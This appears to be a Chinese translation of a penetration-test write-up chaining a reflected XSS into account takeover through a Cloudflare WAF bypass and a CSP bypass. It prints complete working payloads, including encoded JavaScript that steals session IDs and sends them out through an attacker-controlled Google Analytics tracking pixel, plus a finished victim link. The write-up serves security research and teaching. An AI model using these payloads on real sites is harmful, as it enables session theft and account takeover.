@@ -1,0 +1,268 @@
+> 译文来源：<https://sensepost.com/blog/2021/from-500-to-account-> takeover/>。受个人知识所限及偏见影响，部分内容可能会存在过度曲解及误解情况，望各位师傅包含并提出建议，感谢。
+
+## 简介
+
+在一次漏洞评估的过程中，一个位于HTTP
+500“内部服务器错误”页面上的普通跨站脚本（XSS）漏洞，被我成功地变成了一键式的账户接管。在本篇博客中，我希望将本次我利用已知的Cloudflare
+WAF绕过技术，和利用Google Analytics作为CSP绕过手段来提取会话口令的方式给大家叙述一下。
+
+### 信息侦查
+
+在评估开始时，我很快就注意到该Web应用将会话ID作为某种JavaScript报错函数的一部分存储在了一个`message`变量里。且如果`window.error`事件被触发的话，该函数就会被执行。
+
+![wKg0C2JSyWeAXvjcAADKQkMgZU471.png](https://image.3001.net/images/20220509/1652066185_627887896accbfc8aa5e2.png!small)
+
+于是我便着手去寻找一种提取这些数据的方法。有什么会是可能性和理论上更适合做这件事的中间人呢？当然是XSS！
+
+![wKg0C2JSyWACx3AAABiQozzAnw727.png](https://image.3001.net/images/20220509/1652066185_62788789bfce0af873e06.png!small)
+
+在评估过程中，我的同事[Koen
+Claes](https://twitter.com/koenclaes_)提到了这个有意思的XSS向量，我们可以在一个500“内部服务器错误”页面上找到它。请注意下方URL中的`EndUserVisibleHtmlMessage`参数：
+
+    
+    
+    https://webapp.example.eu/Shared/VisibleError?NotDialog=True&ErrorCode=&EndUserVisibleHtmlMessage=<XSSpayloadhere>&ShowWarningIcon=False&Title=Culture+change+detected&CultureInfo=be-EN&Print=False
+    
+
+这听上去不是很安全，不是吗？事实上，这种情况下几乎太容易去执行该漏洞了。但是，出现了一个问题！当我们利用该参数想要成功触发XSS时碰到了两处防护措施，因此我们需要制定一个攻击计划：
+
+  1. 1.攻破Cloudflare“军事级别的AI增强型”Web应用防火墙（WAF）
+  2. 2.欺骗我们的好朋友，CSP先生
+
+由于CLoudflare通常是部署在应用程序前面的，这就意味着像是`<
+script>alert(1)</script>`这样简单的的payload将不会起到任何效果。
+
+## DNS覆盖
+
+我们首先想到的是尝试一种比较常用的手段在客户端层面上来绕过WAF： **DNS覆盖**
+。假设我们能够找到Cloudflare背后的源服务器（并且它允许来自公网的连接），我们就可以通过直接与该服务器相连从而绕过WAF。
+
+有许多众所周知的方法都能够找到那些受云WAF（或者干脆就是指Cloudflare WAF本身的扩展应用）保护的web服务背后的源服务器。比方说：
+
+  1. 1.在Censys或类似的服务中搜索目标网站的域名，这样会显示出有哪些服务器正在使用与目标服务器相同的TLS证书等信息
+  2. 2.通过在Shodan上搜索相同的favico哈希值来尝试暴露出相关地址（可以通过在<https://github.com/pielco11/fav-up>上实现）
+  3. 3.查询DNS历史数据
+
+一旦你获取到了源服务器的IP地址，Burp Suite允许在“Project Options(项目选项)” -> “Hostname
+Resolution(主机名解析)”处快速设置你自己的DNS记录。
+
+![wKg0C2JSyXWAAq8zAABaO91LyQ511.png](https://image.3001.net/images/20220509/1652066186_6278878a3906fb82892c2.png!small)
+
+当将我们发现的源服务器IP地址填入并启用“Hostname
+Resolution”后，Koen证实了他的想法，的确可以触发XSS。那个周所周知的`alert(1)`弹框就要执行了。
+
+但你们可能会想“在针对受害者进行攻击时，这种方法在尝试绕过Cloudflare并不总是可行的”。你们想的没错，尤其是当你无法访问到受害者的基础设备或计算机时。因此这种方法并不能真正地作为我们攻击链中的一环，我们便转而专注于在应用程序层面上去绕过Cloudflare。
+
+## 基于签名绕过Cloudflare的方法
+
+Cloudflare做了很多非常酷的事情，我也推荐你们可以去看一下他们的博客！但他们也有做得不好的地方，一些众所周知的WAF绕过手段似乎并没有引起他们的注意/未修复。我查到了一个在我们案例中使用的绕过手段，发现它早在2019年6月份就被上报了，但截至目前2021年2月份却仍然有效。
+
+> Cloudflare的XSS绕过可以通过添加8位或更多位多余的十进制前导零，或是添加7位或更多位十六进制的前导零来实现。
+>
+> 十进制：
+>
+> 十六进制：
+>
+> — Bohdan Korzhynskyi (@bohdansec) [June 4,
+> 2019](https://twitter.com/bohdansec/status/1135699501707091968?ref_src=twsrc%5Etfw)
+
+那条推特实际上是我在Google上第一个找到的绕过Cloudflare的推文......结果它就真的可以成功绕过并实现弹框。
+
+    
+    
+    https://webapp.example.eu/Shared/VisibleError?NotDialog=True&ErrorCode=&EndUserVisibleHtmlMessage=%3Csvg%20onload%3Dprompt%2526%252300000000401)%3E&ShowWarningIcon=False&Title=Culture+change+detected&CultureInfo=be-EN&Print=False
+    
+
+我还发现了一些不对劲的地方，如果在URL中存在一个`eval`可执行代码字符串，只要第一个括号`(`被替换成了`%26%230000000040`，WAF就不会对其进行拦截。
+
+不管怎么说，第一件恼人的事情总算是解决掉了：
+
+  * “攻破Cloudflare的“军事级别的AI增强型”WAF“
+
+下一个问题，谢谢:)
+
+  * 欺骗我们的好朋友，CSP先生
+
+## CSP 绕过
+
+该web应用程序中存在以下内容安全策略（CSP）：
+
+    
+    
+    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ssl.google-analytics.com https://maps.googleapis.com https://webapp.example.eu https://connect.facebook.net https://themes.example.eu; img-src 'self' https://ssl.google-analytics.com https://s-static.ak.facebook.com https://webapp.example.eu https://themes.example.eu http://images-awstest.example.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://webapp.example.eu https://themes.example.eu; font-src 'self' https://themes.googleusercontent.com; frame-src https://webapp.example.eu https://www.facebook.com https://s-static.ak.facebook.com; object-src 'none'
+    
+
+通过详细地检查CSP后，我们发现由于在CSP中设置了” 'self'，'unsafe-inline'，'unsafe-eval'
+“，它只允许运行来自其域本身的脚本。
+
+所以我想，或许可以写一个利用Burp Collaborator中URL的`fetch()`方法来解决这个问题，但后来证实我想多了......
+我们发现了一个错误，提示`connect-src`不支持`fetch()`函数来对未声明域进行外部HTTP调用。只有对源域才是有效的。
+
+![wKg0C2JSyXqANCD4AAEhUtxZUn4934.png](https://image.3001.net/images/20220509/1652066186_6278878a6cdc7e9cab010.png!small)
+
+尽管`connect-src`在CSP中并没有写明，但是`default-src
+'self'`会禁止任何未声明的指令被“恶意”执行。好吧，那究竟什么才是被允许的呢？
+
+    
+    
+    img-src https://ssl.google-analytics.com
+    
+
+或许这对于大多数人来说算是敲响了一次警钟吧。可以通过Google Analytics来进行提取会话口令！但是要怎么做呢？
+
+## Google Analytics
+
+和Facebook一样，Google
+Analytics通过跟踪像素来提供跟踪功能。通常，跟踪像素会进行一些日志记录/指纹识别，但在本例中，我们可以主动将其利用为一个数据提取的通道。
+
+通过深挖[Google
+Analytics文档](https://developers.google.com/analytics/devguides/collection/protocol/v1/parameters)，我们发现可以构造一个有意思的`collect`接口URL。这个URL含有允许包含任意字符串的特定参数。该参数称为`ea`。
+
+![wKg0C2JSyYCAMyVVAABzZQBKpII759.png](https://image.3001.net/images/20220509/1652066186_6278878ab8c4e2883b195.png!small)
+
+为了能够利用跟踪像素成功添加该Google Analytics，需要3个强制性参数：
+
+  1. 1.`tid`，这是我们为执行攻击而设置的Google Analytics PoC账户ID
+  2. 2.`cid`，这是一个随机数，用于区分浏览器/用户，也就是指纹识别
+  3. 3.`ea`，可以对其分配任意字符串
+
+所以，一个简单的示例就会是以下这样：
+
+    
+    
+    https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=13333337&t=event&ec=email&ea=anystring
+    
+
+考虑到该URL，可以保险地说，在完成我们为此次攻击准备的最后一个目标后，我们就可以绕过CSP策略了：
+
+  * 欺骗我们的好朋友，CSP先生
+
+## 攒零合整
+
+我们目前已经具备了实现完整攻击链所需的4个部分，简单回顾一下，分别是：
+
+  1. 1.可在JavaScript函数可访问的SessionID
+  2. 2.Cloudflare绕过
+  3. 3.CSP绕过
+  4. 一个Google Analytics`collect`接口URL
+
+接下来就让我们将各环相扣，准备窃取会话id吧！
+
+## 利用JavaScript对SessionID切片
+
+正如简介所述，该应用将用户的会话cookie等信息放在了一个报错函数中。那么还有什么方法会比一个正则表达式来提取我们想要的值更合适呢？
+
+我们借助[regex101.com](https://regex101.com/)并快速构建了一个正则表达式，用于提取该特定字段及其对应的值，一个24个字符的字母数字会话ID，如下所示。
+
+![wKg0C2JSyYWAId9CAADHwmfC7sk376.png](https://image.3001.net/images/20220509/1652066186_6278878ae72e7314dfa0a.png!small)
+
+而实际的正则表达式为：
+
+    
+    
+    /(?:SessionID: (?:[a-zA-Z0-9-_]{24}))/gm
+    
+
+![wKg0C2JSyYqAPwrdAACPFYCF5xM996.png](https://image.3001.net/images/20220509/1652066187_6278878b35a9b1de90b80.png!small)
+
+## 编写payload代码
+
+由于我们想将Google Analytics跟踪像素附加到我们的网页上，我们将不得不定义一个新变量，我们把它称为`gaimage`：
+
+    
+    
+    var gaimage = document.createElement("img");
+    
+
+接下来，声明我们的`regex`变量：
+
+    
+    
+    var regex = /(?:SessionID: (?:[a-zA-Z0-9-_]{24}))/gm;
+    
+
+下面的步骤可能会有点复杂。
+
+该应用程序在HTTP响应状态为`200 OK`时才会返回之前提到的那个JavaScript报错函数，但由于我们的XSS入口是在HTTP 500
+“内部服务器错误”页面上发现的，所以我们不得不使用一下 **跨站请求伪造**
+。简单来说上是向一个页面发出请求，该页面的响应中会包含我们需要提取出来的会话ID。
+
+关于我们的payload，下面的JavaScript将执行以下操作：
+
+  1. 1.获取HTTP响应状态为`200 OK`的页面的内容，为了设计PoC，我们在示例中填写的是一个名为`/Search/Criteria`的随机页面URL
+  2. 2.将我们的Google Analytics`collect`接口URL作为源分配给`img`标签的属性
+  3. 3.`cid`由`Math.random()`函数随机生成
+  4. 4.最重要的是，`ea`参数中填入了为提取`SessionID`用到的正则表达式
+
+    
+    
+    fetch("/Search/Criteria").then(response => response.text()).then(data => gaimage.src = "https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=" + Math.floor(Math.random() * 8999999999 + 1000000000) + "&t=event&ec=email&ea=" + encodeURIComponent(data.match(regex)));
+    
+
+最后，通过将实际的`gaimage`追加到HTML DOM中来完成此代码：
+
+    
+    
+    document.head.appendChild(gaimage);
+    
+
+我们的JavaScript生成的恶意`img`元素，看起来如下：
+
+    
+    
+    <img src="https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=8664644683&t=event&ec=email&ea=SessionID%3A%20ppqiitmapj45dq1dacmgeo0a">
+    
+
+## 构建HTML注入
+
+作为我们攻击准备的最后一步，我们需要在`EndUserVisibleHtmlMessage`参数中尽可能整齐地整合所有内容，XSS将会在此处触发。
+
+为了防止出现编码问题（或规避一些可能的检测），我选择使用base64再用URL编码对JavaScript payload进行编码，这意味着这段代码：
+
+    
+    
+    var gaimage = document.createElement("img");
+    var regex = /(?:SessionID: (?:[a-zA-Z0-9-_]{24}))/gm; fetch("/Search/Criteria").then(response => response.text()).then(data => gaimage.src = "https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=" + Math.floor(Math.random() * 8999999999 + 1000000000) + "&t=event&ec=email&ea=" + encodeURIComponent(data.match(regex)));
+    document.head.appendChild(gaimage);
+    
+
+将会变成这样：
+
+    
+    
+    dmFyIGdhaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKdmFyIHJlZ2V4ID0gLyg%2FOlNlc3Npb25JRDogKD86W2EtekEtWjAtOS1fXXsyNH0pKS9nbTsgZmV0Y2goIi9TZWFyY2gvQ3JpdGVyaWEiKS50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0%2BIGdhaW1hZ2Uuc3JjID0gImh0dHBzOi8vc3NsLmdvb2dsZS1hbmFseXRpY3MuY29tL2NvbGxlY3Q%2Fdj0xJnRpZD1VQS0xOTAxODMwMTUtMSZjaWQ9IiArIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDg5OTk5OTk5OTkgKyAxMDAwMDAwMDAwKSArICImdD1ldmVudCZlYz1lbWFpbCZlYT0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRhdGEubWF0Y2gocmVnZXgpKSk7CmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoZ2FpbWFnZSk7
+    
+
+这也意味着，输出的payload本身必须按照我们编码时的步骤进行解码以构建HTML payload：
+
+    
+    
+    <svg onload=eval(atob(decodeURIComponent("dmFyIGdhaW1hZ2U9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7IHZhciByZWdleCA9IC8oPzpTZXNzaW9uSUQ6ICg/OlthLXpBLVowLTktX117MjR9KSkvZ207IGZldGNoKCIvU2VhcmNoL0NyaXRlcmlhIikudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBnYWltYWdlLnNyYz0iaHR0cHM6Ly9zc2wuZ29vZ2xlLWFuYWx5dGljcy5jb20vY29sbGVjdD92PTEmdGlkPVVBLTE5MDE4MzAxNS0xJmNpZD0iK01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDg5OTk5OTk5OTkgKyAxMDAwMDAwMDAwKSsiJnQ9ZXZlbnQmZWM9ZW1haWwmZWE9IitlbmNvZGVVUklDb21wb25lbnQoZGF0YS5tYXRjaChyZWdleCkpKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChnYWltYWdlKTs=")))>
+    
+
+但是，像上面这样的HTML将不会起作用，因为它没有进行Cloudflare绕过的处理。通过应用我之前提到的Cloudflare绕过手段，我们最终就得到一个可以发送给受害者链接了：
+
+    
+    
+    https://webapp.example.eu/Shared/VisibleError?NotDialog=True&ErrorCode=&EndUserVisibleHtmlMessage=%3Csvg%20onload=eval%26%230000000040atob%26%230000000040decodeURIComponent%26%230000000040%22dmFyIGdhaW1hZ2U9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7IHZhciByZWdleCA9IC8oPzpTZXNzaW9uSUQ6ICg%2FOlthLXpBLVowLTktX117MjR9KSkvZ207IGZldGNoKCIvU2VhcmNoL0NyaXRlcmlhIikudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBnYWltYWdlLnNyYz0iaHR0cHM6Ly9zc2wuZ29vZ2xlLWFuYWx5dGljcy5jb20vY29sbGVjdD92PTEmdGlkPVVBLTE5MDE4MzAxNS0xJmNpZD0iK01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDg5OTk5OTk5OTkgKyAxMDAwMDAwMDAwKSsiJnQ9ZXZlbnQmZWM9ZW1haWwmZWE9IitlbmNvZGVVUklDb21wb25lbnQoZGF0YS5tYXRjaChyZWdleCkpKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChnYWltYWdlKTs%3D%22)))%3E&ShowWarningIcon=False&Title=Culture+change+detected&CultureInfo=be-EN&Print=False
+    
+
+## 受害者的视角
+
+从受害者浏览器的角度来看，`<img>`标签会被插入到DOM中，如下所示。
+
+![wKg0C2JSyZGAH4oPAAB85CDGqME72.jpeg](https://image.3001.net/images/20220509/1652066187_6278878b6e17f5670d2c1.jpeg!small)
+
+在浏览器中执行的HTML注入不会触发客户端报错。随着会话ID被添加到一个跟踪像素上，payload就已经准备好通过Google
+Analytics来发送给攻击者了。
+
+## 攻击者的视角
+
+在攻击者的Google Analytics面板中，我们可以看到受害者会话ID被作为“活跃用户”发送到我们的应用程序上:)
+
+![wKg0C2JSyZqAJUQBAABVgngVfcc526.png](https://image.3001.net/images/20220509/1652066187_6278878ba42b5a6cd53dd.png!small)
+
+将这些漏洞串联起来，通过向受害者发送一个链接从而最终实现了账户接管。
+
+ **补充说明：** 使用带有跟踪保护功能广告拦截器的用户不易受到此类攻击，因为对Google Analytics 的请求通常会被这些扩展程序阻拦。
+
